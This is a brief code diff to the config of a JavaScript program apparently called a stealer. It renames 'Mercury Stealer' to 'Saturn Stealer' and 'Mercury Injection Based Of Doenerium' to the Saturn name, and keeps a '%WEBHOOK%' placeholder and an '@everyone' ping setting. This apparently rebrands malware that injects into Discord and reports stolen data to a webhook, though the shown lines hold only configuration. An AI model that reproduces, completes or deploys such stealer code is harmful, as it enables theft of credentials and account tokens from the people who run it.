@@ -10,7 +10,7 @@ const fs = require("fs");
 
 
 var config = {
-    brand: "Mercury Stealer",
+    brand: "Saturn Stealer",
 
     webhook: '%WEBHOOK%',
 
@@ -22,9 +22,9 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "Mercury Injection Based Of Doenerium",
+        username: "Saturn Injection Based Of Doenerium",
         footer: {
-            text: `Mercury Injection Based Of Doenerium"`,
+            text: `Saturn Injection Based Of Doenerium"`,
             icon_url: 'https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png'.replace(/ /g, '%20'),
         },
         href: "https://github.com/TheCuteOwl",
